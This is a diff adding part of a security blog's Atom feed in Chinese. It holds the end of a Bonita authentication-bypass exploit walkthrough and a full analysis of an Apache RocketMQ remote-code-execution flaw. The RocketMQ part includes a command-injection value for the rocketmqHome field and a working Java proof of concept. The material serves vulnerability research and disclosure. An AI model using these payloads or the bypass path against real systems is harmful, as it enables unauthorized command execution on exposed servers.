+<p>为实现远程命令执行，思路是上传恶意api接口，上传接口在web.xml中也定义了，为/API/pageUpload</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/07/04/5af1b40c2dc7f.png" alt="1688463586221.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/07/04/2a666539dd826.png" alt="1688463608665.png" loading="lazy"></figure>
+<p>跟进到org.bonitasoft.console.common.server.servlet.PageUploadServlet#getPermissions()</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/07/04/0bc9584459931.png" alt="1688465738533.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/07/04/3fad7630391c3.png" alt="1688472161186.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/07/04/f260e3cad7785.png" alt="1688472347436.png" loading="lazy"></figure>
+<p>这里需要session，所以我们只需要一个普通用户来获取session，然后再通过<code>i18ntranslation</code>绕过鉴权即可。最后将上传的zip的内容解析为API。</p>
+<p>所以我们可以通过<code>/API/pageUpload;i18ntranslation</code>来上传恶意API。</p>
+<p>EXP：https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2022-25237/CVE-2022-25237.py</p>
+<h1 id="漏洞复现">漏洞复现</h1>
+<p>创建普通用户poc/poc</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/07/04/379cda26730ce.png" alt="1688473363631.png" loading="lazy"></figure>
+<p>通过EXP执行whomai命令</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/07/04/4073b4b39159c.png" alt="1688473388524.png" loading="lazy"></figure>
+<p>EXP分析：</p>
+<ol>
+<li>
+<p>使用install/install默认用户登录，成功则打印输出<code>Found default creds: install:install</code>，并且记录session</p>
+</li>
+<li>
+<p>然后使用自己传入的普通用户的user/passwd登录，并且记录session</p>
+</li>
+<li>
+<p>upload_api_extension()上传恶意接口，并返回临时路径</p>
+</li>
+<li>
+<p>activate_api_extension()通过临时路径获取id</p>
+</li>
+<li>
+<p>delete_api_extension()在命令执行结束后，通过id删除恶意API</p>
+</li>
+<li>
+<p>run_cmd()执行命令</p>
+</li>
+</ol>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Apache RocketMQ RCE(CVE-2023-33246)分析]]></title>
+        <id>https://le1a.github.io/post/rocketmq/</id>
+        <link href="https://le1a.github.io/post/rocketmq/">
+        </link>
+        <updated>2023-05-31T14:42:19.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="前言">前言</h1>
+<p>RocketMQ是一个开源的分布式消息队列系统，最初由阿里巴巴集团开发并开源。它旨在提供可靠的、高性能的消息传递和异步通信能力，广泛应用于大规模分布式系统中。</p>
+<h2 id="nameserver与broker等组件之间的关系">NameServer与Broker等组件之间的关系？</h2>
+<p>Apache RocketMQ是一个分布式消息中间件项目，用于支持高可靠性、高性能和可扩展的消息传递。在RocketMQ中，每个消息生产者和消费者都与Broker（代理服务器）建立连接，以进行消息的发送和接收。</p>
+<p>他们的关系如图：</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/01/476abb0bde376.png" alt="1685628743925.png" loading="lazy"></figure>
+<h2 id="name-server">Name Server</h2>
+<blockquote>
+<p>NameServer是一个非常简单的Topic路由注册中心，其角色类似Dubbo中的zookeeper，支持Broker的动态注册与发现。</p>
+<p>主要功能：</p>
+<ul>
+<li>Broker管理：NameServer接受Broker集群的注册信息并且保存下来作为路由信息的基本数据。然后提供心跳检测机制，检查Broker是否还存活(由<code>NamesrvController</code>处理)；</li>
+<li>路由信息管理：每个NameServer将保存关于Broker集群的整个路由信息和用于客户端查询的队列信息。</li>
+</ul>
+</blockquote>
+<h2 id="broker">Broker</h2>
+<blockquote>
+<p>集群最核心模块，主要负责Topic消息存储、消费者的消费位点管理（消费进度）</p>
+<p>Broker会注册到 Name Server上去，无论是否是主从, 每个 Broker 都会注册到 Name Server 上</p>
+<p>Broker也提供心跳机制，检查与生产者和消费者的连接情况，由<code>BrokerController</code>处理</p>
+</blockquote>
+<p>心跳机制是RocketMQ用于维持与Broker之间连接状态的一种机制。通过发送心跳消息，生产者和消费者可以告知Broker它们的存在和正常运行状态。默认情况下，RocketMQ的心跳间隔为30秒。如果2分钟内没有收到心跳数据，则断开连接。</p>
+<p>在RocketMQ中，心跳消息的处理是由Broker的<code>BrokerController</code>负责的。当Broker收到来自生产者或消费者的心跳消息时，<code>BrokerController</code>会处理该消息并维护与对应客户端的连接状态。所以就会调用到</p>
+<p><code>BrokerController#this.filterServerManager.start()</code>，进而触发漏洞。</p>
+<blockquote>
+<p>这也就解释了为什么漏洞是30秒触发一次！</p>
+</blockquote>
+<h1 id="漏洞分析">漏洞分析</h1>
+<p>通过补丁可以看到直接把这些类删除了</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/01/d592ea3f6be85.png" alt="1685596566230.png" loading="lazy"></figure>
+<pre><code class="language-java">public class FilterServerManager {
+  	//......
+    public void createFilterServer() {
+        int more =
+            this.brokerController.getBrokerConfig().getFilterServerNums() - this.filterServerTable.size();
+        String cmd = this.buildStartCommand();
+        for (int i = 0; i &lt; more; i++) {
+            FilterServerUtil.callShell(cmd, log);
+        }
+    }
+
+    private String buildStartCommand() {
+        String config = &quot;&quot;;
+        if (BrokerStartup.CONFIG_FILE_HELPER.getFile() != null) {
+            config = String.format(&quot;-c %s&quot;, BrokerStartup.CONFIG_FILE_HELPER.getFile());
+        }
+
+        if (this.brokerController.getBrokerConfig().getNamesrvAddr() != null) {
+            config += String.format(&quot; -n %s&quot;, this.brokerController.getBrokerConfig().getNamesrvAddr());
+        }
+
+        if (NetworkUtil.isWindowsPlatform()) {
+            return String.format(&quot;start /b %s\\bin\\mqfiltersrv.exe %s&quot;,
+                this.brokerController.getBrokerConfig().getRocketmqHome(),
+                config);
+        } else {
+            return String.format(&quot;sh %s/bin/startfsrv.sh %s&quot;,
+                this.brokerController.getBrokerConfig().getRocketmqHome(),
+                config);
+        }
+    }
+  //......
+}
+</code></pre>
+<pre><code class="language-java">public class FilterServerUtil {
+    public static void callShell(final String shellString, final Logger log) {
+        Process process = null;
+        try {
+            String[] cmdArray = splitShellString(shellString);
+            process = Runtime.getRuntime().exec(cmdArray);
+            process.waitFor();
+            log.info(&quot;CallShell: &lt;{}&gt; OK&quot;, shellString);
+        } catch (Throwable e) {
+            log.error(&quot;CallShell: readLine IOException, {}&quot;, shellString, e);
+        } finally {
+            if (null != process)
+                process.destroy();
+        }
+    }
+
+    private static String[] splitShellString(final String shellString) {
+        return shellString.split(&quot; &quot;);
+    }
+}
+</code></pre>
+<p>可以看到<code>buildStartCommand()</code>函数使用了sh去执行这个startfsrv.sh，这里可以拼接rce。当<code>RocketmqHome</code>的值为<code>-c $@|sh . echo open -a Calculator;</code>时，此时的命令为</p>
+<pre><code class="language-bash">sh -c $@|sh . echo open -a Calculator;/bin/startfsrv.sh -n NamesrvAddr
+</code></pre>
+<p>第一个命令是 <code>sh -c $@</code>，它使用 <code>sh</code> 解释器执行传递给程序的参数。在这段代码中，<code>$@</code> 表示接受传入的参数，并将它们作为命令来执行。</p>
+<p>第二个命令是 <code>sh . echo open -a Calculator;/bin/startfsrv.sh -n NamesrvAddr</code>，这里会打印输出<code>open -a Calculator</code>并返回给<code>$@</code>变量。</p>
+<p>最后执行<code>sh -c open -a Calculator</code></p>
+<p>当执行<code>DefaultMQAdminExt#updateBrokerConfig(&quot;127.0.0.1:10911&quot;, properties)</code>更新配置文件的时候，就会触发<code>BrokerController#filterServerManager.start()</code>，然后调用<code>FilterServerManager#createFilterServer()</code>，最终RCE</p>
+<p>还有一个需要注意的点就是：more不能为0，也就是FilterServerNums不为0即可</p>
+<pre><code class="language-java">int more = this.brokerController.getBrokerConfig().getFilterServerNums() - this.filterServerTable.size();
+</code></pre>
+<p>Poc：</p>
+<pre><code class="language-java">public static void main(String[] args) throws IOException {
+  Properties props = new Properties();
+  props.setProperty(&quot;rocketmqHome&quot;,&quot;-c $@|sh . echo open -a Calculator;&quot;);
+  props.setProperty(&quot;filterServerNums&quot;,&quot;1&quot;);
+  DefaultMQAdminExt admin = new DefaultMQAdminExt();
+  admin.setNamesrvAddr(&quot;localhost:9876&quot;);
+  admin.start();   
+  admin.updateBrokerConfig(&quot;localhost:10911&quot;, props);
+  Properties brokerConfig = admin.getBrokerConfig(&quot;localhost:10911&quot;);
+  admin.shutdown();
+}
+</code></pre>
+<p>利用条件：</p>
+<blockquote>
+<p>1.使用了RocketMQ 5.1.0及以下版本<br>
+2.Broker都开启并暴露在公网上，默认端口为10911</p>
+</blockquote>
+<h1 id="漏洞复现">漏洞复现</h1>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/01/52ca6ab113feb.png" alt="1685598978606.png" loading="lazy"></figure>
+<h1 id="为什么攻击的时候并不需要真实的nameserver地址">为什么攻击的时候并不需要真实的NameServer地址？</h1>
+<p>需要<code>NameServer</code>的原因是<code>updateBrokerConfig()</code>函数需要传入<code>NameServer</code>，所以它不能为空</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/01/345fc6c1def7a.png" alt="1685624486302.png" loading="lazy"></figure>
+<p>接着我们来看一下命令拼接的地方</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/01/df8241f27b0ae.png" alt="1685625242067.png" loading="lazy"></figure>
+<p>这里执行的是:</p>
+<pre><code class="language-bash">sh ${rocketmqhome}/bin/startfsrv.sh -n ${NameServer}
+</code></pre>
+<p>我们拼接的命令为:</p>
+<pre><code class="language-bash">sh -c $@|sh . echo open -a Calculator;/bin/startfsrv.sh -n ${NameServer}
+</code></pre>
+<p><code>$@</code>是一个特殊的参数，用于表示传递给脚本的所有参数列表</p>
+<p><code>echo open -a Calculator</code>  得到 <code>open -a Calculator</code>传递给<code>$@</code></p>
+<p>然后再被<code>sh -c</code>执行</p>
+<p>这里我们的命令执行已经完成了，后面的<code>/bin/startfsrv.sh</code>并没有被执行，<code>${NameServer}</code>也就自然用不上了。如果想让sh正常执行，只需要在前面多一个小数点就行，但跟漏洞利用没关系了。</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/01/37d98770a7ccc.png" alt="1685626365510.png" loading="lazy"></figure>
+<p>这个<code>/bin/startfsrv.sh</code>脚本的意义就是：</p>
+<p>设置环境变量<code>ROCKETMQ_HOME</code>并启动<code>RocketMQ的Filtersrv</code>服务，并且将传入进来的<code>${NameServer}</code>赋予给<code>$@</code>变量，用于后续<code>FiltersrvStartup</code>类使用。但是我没找到这个类</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/01/6a8caaf3a5daa.png" alt="1685627249166.png" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2023/06/01/4a62840fef0f2.png" alt="1685627441570.png" loading="lazy"></figure>
+<p>应该这个类在之前被删除掉了，但这里的sh脚本还没更新。</p>
+<blockquote>
+<p>所以在这个漏洞利用的过程中，不需要使用真实的NameServer地址，只需要让他不为空即可。</p>
+</blockquote>
+]]></content>
+    </entry>
+</feed>
